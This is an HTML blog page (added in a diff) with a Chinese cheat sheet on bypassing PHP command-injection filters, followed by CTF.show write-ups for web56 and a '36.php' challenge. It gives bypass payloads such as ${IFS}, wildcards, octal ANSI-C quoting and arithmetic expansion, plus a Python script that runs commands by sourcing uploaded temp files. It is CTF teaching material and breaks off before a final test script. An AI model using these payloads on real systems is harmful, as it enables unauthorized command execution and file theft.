@@ -1,0 +1,758 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="John Doe">
+
+
+
+
+
+<title>命令执行绕过技巧大全 | 菜菜のblog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const pagebody = document.getElementsByTagName('body')[0]
+
+            function setTheme(status) {
+
+                if (status === 'dark') {
+                    window.sessionStorage.theme = 'dark'
+                    pagebody.classList.add('dark-theme');
+
+                } else if (status === 'light') {
+                    window.sessionStorage.theme = 'light'
+                    pagebody.classList.remove('dark-theme');
+                }
+            };
+
+            setTheme(window.sessionStorage.theme)
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saisi&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/category">Categories</a>
+                
+                <a class="menu-item" href="/tag">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saisi&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">
+                    <svg class="menu-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M4.5 17.27q-.213 0-.356-.145T4 16.768t.144-.356t.356-.143h15q.213 0 .356.144q.144.144.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.144T4 11.999t.144-.356t.356-.143h15q.213 0 .356.144t.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.143Q4 7.443 4 7.23t.144-.356t.356-.143h15q.213 0 .356.144T20 7.23t-.144.356t-.356.144z"/></svg>
+                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE --><path fill="currentColor" d="m12 12.708l-5.246 5.246q-.14.14-.344.15t-.364-.15t-.16-.354t.16-.354L11.292 12L6.046 6.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 11.292l5.246-5.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354L12.708 12l5.246 5.246q.14.14.15.345q.01.203-.15.363t-.354.16t-.354-.16z"/></svg>
+                </div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/category">Categories</a>
+                
+                <a class="menu-item" href="/tag">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.classList.contains("active")) {
+            toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        } else {
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">命令执行绕过技巧大全</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">John Doe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">September 5, 2026&nbsp;&nbsp;10:00:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="一、cat-的替代品"><a href="#一、cat-的替代品" class="headerlink" title="一、cat 的替代品"></a>一、cat 的替代品</h2><p>当 <code>cat</code> 被过滤时，以下命令都可以代替 <code>cat</code> 读取文件内容：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>nl</code></td>
+<td>带行号输出</td>
+<td>最常用替代</td>
+</tr>
+<tr>
+<td><code>tac</code></td>
+<td>反向输出（cat 倒过来）</td>
+<td>行顺序反转</td>
+</tr>
+<tr>
+<td><code>rev</code></td>
+<td>每行内容反转</td>
+<td>字母顺序反转</td>
+</tr>
+<tr>
+<td><code>more</code></td>
+<td>分页查看</td>
+<td>交互式</td>
+</tr>
+<tr>
+<td><code>less</code></td>
+<td>分页查看（增强版）</td>
+<td>交互式</td>
+</tr>
+<tr>
+<td><code>head</code></td>
+<td>从头输出前 N 行</td>
+<td><code>head -n 5 file</code></td>
+</tr>
+<tr>
+<td><code>tail</code></td>
+<td>从尾输出后 N 行</td>
+<td><code>tail -n 5 file</code></td>
+</tr>
+<tr>
+<td><code>sort</code></td>
+<td>排序后输出</td>
+<td>行顺序被打乱</td>
+</tr>
+<tr>
+<td><code>grep</code></td>
+<td>搜索并输出匹配行</td>
+<td><code>grep . file</code> 输出全部</td>
+</tr>
+<tr>
+<td><code>uniq</code></td>
+<td>去重后输出</td>
+<td>不常用</td>
+</tr>
+<tr>
+<td><code>od</code></td>
+<td>八进制&#x2F;十六进制显示</td>
+<td>无 <code>&lt;?php</code> 截断问题</td>
+</tr>
+<tr>
+<td><code>base64</code></td>
+<td>Base64 编码输出</td>
+<td>无 <code>&lt;?php</code> 截断问题</td>
+</tr>
+</tbody></table>
+<p><strong>实战经验：</strong> 读取 PHP 文件时，<code>cat</code> 输出中的 <code>&lt;?php</code> 会被服务器解释执行导致截断，此时用 <code>base64</code> 或 <code>od</code> 代替。</p>
+<hr>
+<h2 id="二、空格绕过"><a href="#二、空格绕过" class="headerlink" title="二、空格绕过"></a>二、空格绕过</h2><p>当空格被过滤时：</p>
+<table>
+<thead>
+<tr>
+<th>替代品</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>${IFS}</code></td>
+<td>IFS 内部字段分隔符，推荐</td>
+</tr>
+<tr>
+<td><code>$IFS$9</code></td>
+<td>加 <code>$9</code> 防止粘合</td>
+</tr>
+<tr>
+<td><code>&lt;</code></td>
+<td>重定向代替空格：<code>cat&lt;file</code></td>
+</tr>
+<tr>
+<td><code>%09</code></td>
+<td>URL 编码的 Tab（需 <code>%</code> 未被过滤）</td>
+</tr>
+<tr>
+<td><code>\x20</code></td>
+<td>十六进制空格（需 <code>\x</code> 未被过滤）</td>
+</tr>
+</tbody></table>
+<p><strong>示例：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nl$&#123;IFS&#125;flag.php</span><br><span class="line">cat&lt;flag.php</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、通配符绕过关键字"><a href="#三、通配符绕过关键字" class="headerlink" title="三、通配符绕过关键字"></a>三、通配符绕过关键字</h2><p>当 <code>flag</code>、<code>php</code> 等关键字被过滤时，用 shell 通配符匹配：</p>
+<table>
+<thead>
+<tr>
+<th>通配符</th>
+<th>含义</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>*</code></td>
+<td>匹配任意长度</td>
+<td><code>f*</code> → <code>flag.php</code>, <code>flag.txt</code></td>
+</tr>
+<tr>
+<td><code>?</code></td>
+<td>匹配单个字符</td>
+<td><code>f???????</code> → <code>flag.php</code>（8个字符）</td>
+</tr>
+</tbody></table>
+<p><strong>注意：</strong></p>
+<ul>
+<li><code>*</code> 在 URL 中有时会被转义为 <code>%2A</code></li>
+<li><code>?</code> 在 URL 中是参数分隔符，需要用 <code>%3F</code> 编码</li>
+<li><code>?</code> 通配符逐个字符匹配，更精准</li>
+</ul>
+<p><strong>示例：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat f*           → 读取所有 f 开头的文件</span><br><span class="line">nl f???????      → 匹配 8 个字符的文件名（flag.php）</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、正则-子序列绕过"><a href="#四、正则-子序列绕过" class="headerlink" title="四、正则 .* 子序列绕过"></a>四、正则 <code>.*</code> 子序列绕过</h2><p>当过滤规则用 <code>.*x.*y.*z.*</code> 拦截整个单词时，意思是 <strong>x、y、z 按顺序出现在字符串中就算匹配</strong>。</p>
+<p><strong>示例：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*c.*a.*t.*/i&quot;</span>, <span class="variable">$c</span>)  <span class="comment">// 拦截所有包含 &quot;cat&quot; 子序列的字符串</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/i&quot;</span>, <span class="variable">$c</span>) <span class="comment">// 拦截所有包含 &quot;flag&quot; 子序列的字符串</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过方法：选一个字母不在被拦截序列中的命令</strong></p>
+<table>
+<thead>
+<tr>
+<th>被拦截的单词</th>
+<th>可用替代</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>cat</code></td>
+<td><code>nl</code>、<code>rev</code>、<code>tac</code></td>
+</tr>
+<tr>
+<td><code>flag</code></td>
+<td><code>f*</code>、<code>f???????</code> 通配</td>
+</tr>
+<tr>
+<td><code>more</code></td>
+<td><code>nl</code>、<code>less</code>、<code>head</code></td>
+</tr>
+<tr>
+<td><code>head</code></td>
+<td><code>nl</code>、<code>rev</code>、<code>tail</code></td>
+</tr>
+<tr>
+<td><code>nl</code></td>
+<td><code>rev</code>（<code>r</code>-<code>e</code>-<code>v</code> 不在常见黑名单中）</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="五、-a-z-字母全拦截"><a href="#五、-a-z-字母全拦截" class="headerlink" title="五、[a-z] 字母全拦截"></a>五、<code>[a-z]</code> 字母全拦截</h2><p>当所有小写字母都被过滤时，用 <strong>ANSI-C 引号</strong> 绕过：</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#x27;\xxx&#x27;  →  Shell 解析八进制码 → 还原成字符</span><br></pre></td></tr></table></figure>
+
+<p><code>\xxx</code> 是字符的八进制 ASCII 码，Shell 在解析阶段就把它们还原成字母，<strong>PHP 的 <code>preg_match</code> 检查的是原始字符串</strong>，看不到转换后的字母。</p>
+<h3 id="八进制编码对照表"><a href="#八进制编码对照表" class="headerlink" title="八进制编码对照表"></a>八进制编码对照表</h3><table>
+<thead>
+<tr>
+<th>字符</th>
+<th>八进制</th>
+<th>字符</th>
+<th>八进制</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>a</code></td>
+<td><code>\141</code></td>
+<td><code>n</code></td>
+<td><code>\156</code></td>
+</tr>
+<tr>
+<td><code>b</code></td>
+<td><code>\142</code></td>
+<td><code>o</code></td>
+<td><code>\157</code></td>
+</tr>
+<tr>
+<td><code>c</code></td>
+<td><code>\143</code></td>
+<td><code>p</code></td>
+<td><code>\160</code></td>
+</tr>
+<tr>
+<td><code>d</code></td>
+<td><code>\144</code></td>
+<td><code>q</code></td>
+<td><code>\161</code></td>
+</tr>
+<tr>
+<td><code>e</code></td>
+<td><code>\145</code></td>
+<td><code>r</code></td>
+<td><code>\162</code></td>
+</tr>
+<tr>
+<td><code>f</code></td>
+<td><code>\146</code></td>
+<td><code>s</code></td>
+<td><code>\163</code></td>
+</tr>
+<tr>
+<td><code>g</code></td>
+<td><code>\147</code></td>
+<td><code>t</code></td>
+<td><code>\164</code></td>
+</tr>
+<tr>
+<td><code>h</code></td>
+<td><code>\150</code></td>
+<td><code>u</code></td>
+<td><code>\165</code></td>
+</tr>
+<tr>
+<td><code>i</code></td>
+<td><code>\151</code></td>
+<td><code>v</code></td>
+<td><code>\166</code></td>
+</tr>
+<tr>
+<td><code>j</code></td>
+<td><code>\152</code></td>
+<td><code>w</code></td>
+<td><code>\167</code></td>
+</tr>
+<tr>
+<td><code>k</code></td>
+<td><code>\153</code></td>
+<td><code>x</code></td>
+<td><code>\170</code></td>
+</tr>
+<tr>
+<td><code>l</code></td>
+<td><code>\154</code></td>
+<td><code>y</code></td>
+<td><code>\171</code></td>
+</tr>
+<tr>
+<td><code>m</code></td>
+<td><code>\155</code></td>
+<td><code>z</code></td>
+<td><code>\172</code></td>
+</tr>
+<tr>
+<td><code>.</code></td>
+<td><code>\056</code></td>
+<td><code>-</code></td>
+<td><code>\055</code></td>
+</tr>
+</tbody></table>
+<h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><p>每个单词包在 <code>$&#39;...&#39;</code> 里，单词之间用<strong>真实空格</strong>隔开：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#x27;\143\141\164&#x27; $&#x27;\146\154\141\147\056\160\150\160&#x27;</span><br><span class="line">   ↓ 解码                    ↓ 解码</span><br><span class="line">  &quot;cat&quot;                   &quot;flag.php&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="完整示例"><a href="#完整示例" class="headerlink" title="完整示例"></a>完整示例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=$&#x27;\154\163&#x27;                              → ls</span><br><span class="line">?c=$&#x27;\160\167\144&#x27;                          → pwd</span><br><span class="line">?c=$&#x27;\156\154&#x27; $&#x27;\52&#x27;                       → nl *</span><br><span class="line">?c=$&#x27;\142\141\163\145\66\64&#x27; $&#x27;\146\154\141\147\056\160\150\160&#x27;</span><br><span class="line">  → base64 flag.php（推荐，避免 &lt;?php 截断）</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、-和-的绕过"><a href="#六、-和-的绕过" class="headerlink" title="六、$ 和 ; 的绕过"></a>六、<code>$</code> 和 <code>;</code> 的绕过</h2><table>
+<thead>
+<tr>
+<th>被拦截</th>
+<th>绕过方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>;</code>（命令分隔符）</td>
+<td><code>%0a</code>（换行符）或 &#96;</td>
+</tr>
+<tr>
+<td><code>${IFS}</code> 本身被拦</td>
+<td>用真实空格或 <code>%09</code>（Tab）</td>
+</tr>
+<tr>
+<td>数字 0-9</td>
+<td>用 <code>?</code> 通配替代</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="七、速查表"><a href="#七、速查表" class="headerlink" title="七、速查表"></a>七、速查表</h2><p><strong>看到过滤规则直接查：</strong></p>
+<table>
+<thead>
+<tr>
+<th>过滤规则</th>
+<th>绕过思路</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>flag</code> 关键字</td>
+<td><code>f*</code> 通配</td>
+</tr>
+<tr>
+<td><code>cat</code> 关键字</td>
+<td><code>nl</code>、<code>rev</code>、<code>tac</code>、<code>more</code>、<code>head</code></td>
+</tr>
+<tr>
+<td>空格</td>
+<td><code>${IFS}</code></td>
+</tr>
+<tr>
+<td><code>*</code> 通配符</td>
+<td><code>?</code> 逐个字符匹配</td>
+</tr>
+<tr>
+<td><code>[a-z]</code> 所有字母</td>
+<td><code>$&#39;\xxx\xxx\xxx&#39;</code> ANSI-C 引号</td>
+</tr>
+<tr>
+<td><code>.*c.*a.*t.*</code> 子序列</td>
+<td>选字母不在序列中的替代命令（如 <code>rev</code>）</td>
+</tr>
+<tr>
+<td><code>.php</code> 后缀拼接</td>
+<td><code>?&gt;</code> 闭合或 <code>data://</code>（文件包含场景）</td>
+</tr>
+<tr>
+<td>数字 0-9</td>
+<td><code>?</code> 通配代替</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="八、实战案例：CTF-show-两道命令执行题"><a href="#八、实战案例：CTF-show-两道命令执行题" class="headerlink" title="八、实战案例：CTF.show 两道命令执行题"></a>八、实战案例：CTF.show 两道命令执行题</h2><h3 id="案例一：web56-—-文件上传-glob-绕过"><a href="#案例一：web56-—-文件上传-glob-绕过" class="headerlink" title="案例一：web56 — 文件上传 + glob 绕过"></a>案例一：web56 — 文件上传 + glob 绕过</h3><p><strong>源码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|[0-9]|\`|\#|\&#x27;|\&quot;|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>字母、数字、几乎所有特殊字符都被过滤了，但 <code>system($c)</code> 是任意命令执行。</p>
+<p><strong>思路：利用 PHP 文件上传机制</strong></p>
+<ol>
+<li>发送 POST 请求上传一个文件，文件内容就是命令</li>
+<li>PHP 会在 <code>/tmp/</code> 下创建临时文件 <code>phpXXXXXX</code>（9位）</li>
+<li>用 Shell 的 <code>.</code>（source）命令执行这个临时文件</li>
+</ol>
+<p><strong>关键是 glob 匹配临时文件：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. /???/????????[@-[]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>/???/</code> → 匹配 <code>/tmp/</code>（3位目录名）</li>
+<li><code>????????</code> → 匹配 8 个任意字符</li>
+<li><code>[@-[]</code> → 匹配大写字母 A-Z（ASCII 范围 0x40-0x5B）</li>
+</ul>
+<p>为什么要 <code>[@-[]</code>？因为 <code>/usr/bin/</code> 下的 BusyBox 命令都是小写字母，<code>[@-[]</code> 只匹配大写字母，跳过所有小写命令，才能匹配到 PHP 临时文件（随机字符中约 42% 概率最后一位是大写）。</p>
+<p><strong>完整脚本：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">TARGET = <span class="string">&quot;https://xxx.challenge.ctf.show/&quot;</span></span><br><span class="line">PAYLOAD = <span class="string">&quot;. /???/????????[@-[]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_cmd</span>(<span class="params">cmd, max_retries=<span class="number">100</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_retries):</span><br><span class="line">        files = &#123;<span class="string">&#x27;file&#x27;</span>: (cmd, cmd, <span class="string">&#x27;text/plain&#x27;</span>)&#125;</span><br><span class="line">        params = &#123;<span class="string">&#x27;c&#x27;</span>: PAYLOAD&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(TARGET, params=params, files=files,</span><br><span class="line">                            timeout=<span class="number">5</span>, verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> r.text.strip():</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>, r.text.strip()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">success, output = exec_cmd(<span class="string">&quot;tac /var/www/html/flag*&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键点：</strong> 必须用 <code>requests.post()</code>！PHP 的 <code>$_FILES</code> 只在 POST 请求中填充，GET 不会创建临时文件。</p>
+<hr>
+<h3 id="案例二：flag-in-36-php-—-Shell-算术展开"><a href="#案例二：flag-in-36-php-—-Shell-算术展开" class="headerlink" title="案例二：flag in 36.php — Shell 算术展开"></a>案例二：flag in 36.php — Shell 算术展开</h3><p><strong>源码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>和 web56 不同：这里强行拼接 <code>.php</code> 后缀，需要读取 <code>36.php</code>。</p>
+<p><strong>这题还能用什么字符？</strong><br><code>$</code> <code>(</code> <code>)</code> <code>{</code> <code>}</code> <code>~</code> <code>^</code> <code>!</code> <code>@</code> <code>+</code> <code>/</code> <code>\</code> <code>:</code> <code>_</code> <code>]</code> <code>空格</code></p>
+<p><strong>关键发现：</strong> <code>$</code>、<code>(</code>、<code>)</code> 没被过滤！可以用 <strong>Shell 算术展开</strong> <code>$((...))</code>。</p>
+<h4 id="构造步骤"><a href="#构造步骤" class="headerlink" title="构造步骤"></a>构造步骤</h4><p><strong>Step 1：0 和 1</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(( ))        <span class="comment"># 空算术 = 0</span></span><br><span class="line">$((!$(( ))))  <span class="comment"># !0 = 1</span></span><br></pre></td></tr></table></figure>
+
+<p>空格在 URL 中编码为 <code>%20</code>，<code>$(( ))</code> 写成 <code>$((%20))</code>。</p>
+<p><strong>Step 2：加法</strong><br><code>+</code> 在 URL 查询字符串中会被解码为空格，用 <code>%2b</code>（URL 编码的 <code>+</code>）绕过：</p>
+<table>
+<thead>
+<tr>
+<th>数字</th>
+<th>Shell 表达式</th>
+<th>URL 编码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td><code>$((!$(( ))))</code></td>
+<td><code>$((!$((%20))))</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>$((1+1))</code></td>
+<td><code>$((!$((%20))%2b!$((%20))))</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>$((1+1+1))</code></td>
+<td><code>$((!$((%20))%2b!$((%20))%2b!$((%20))))</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td><code>$((1+1+1+1+1+1))</code></td>
+<td><code>$((!$((%20))%2b!$((%20))%2b!$((%20))%2b!$((%20))%2b!$((%20))%2b!$((%20))))</code></td>
+</tr>
+</tbody></table>
+<p><strong>Step 3：拼接多位数</strong><br>Shell 中两个 <code>$(( ))</code> 展开结果会拼接成字符串：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((<span class="number">3</span>))$((<span class="number">6</span>))   <span class="comment"># → &quot;3&quot; + &quot;6&quot; = &quot;36&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>最终 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=$((!$((%20))%2b!$((%20))%2b!$((%20))))$((!$((%20))%2b!$((%20))%2b!$((%20))%2b!$((%20))%2b!$((%20))%2b!$((%20))))</span><br></pre></td></tr></table></figure>
+
+<p>前半段算出 3，后半段算出 6，拼接成 36 → <code>cat 36.php</code>。</p>
+<p><strong>完整执行流程：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. 发送 GET 请求，c = 上述 payload</span><br><span class="line"></span><br><span class="line">2. PHP URL 解码：%20 → 空格，%2b → +</span><br><span class="line">   $c = &quot;$((!$(( ))+!$(( ))+!$(( ))))$((!$(( ))+!$(( ))+!$(( ))+!$(( ))+!$(( ))+!$(( ))))&quot;</span><br><span class="line"></span><br><span class="line">3. preg_match 检查：没有字母、数字、被过滤符号 → 通过</span><br><span class="line"></span><br><span class="line">4. PHP 执行：system(&quot;cat &quot; . $c . &quot;.php&quot;)</span><br><span class="line">   → system(&quot;cat $((...3...))$((...6...)).php&quot;)</span><br><span class="line"></span><br><span class="line">5. Shell 算术展开：$((1+1+1)) = 3，$((1+1+1+1+1+1)) = 6，拼接 → &quot;36&quot;</span><br><span class="line"></span><br><span class="line">6. 最终命令：cat 36.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>测试脚本：</strong></p>
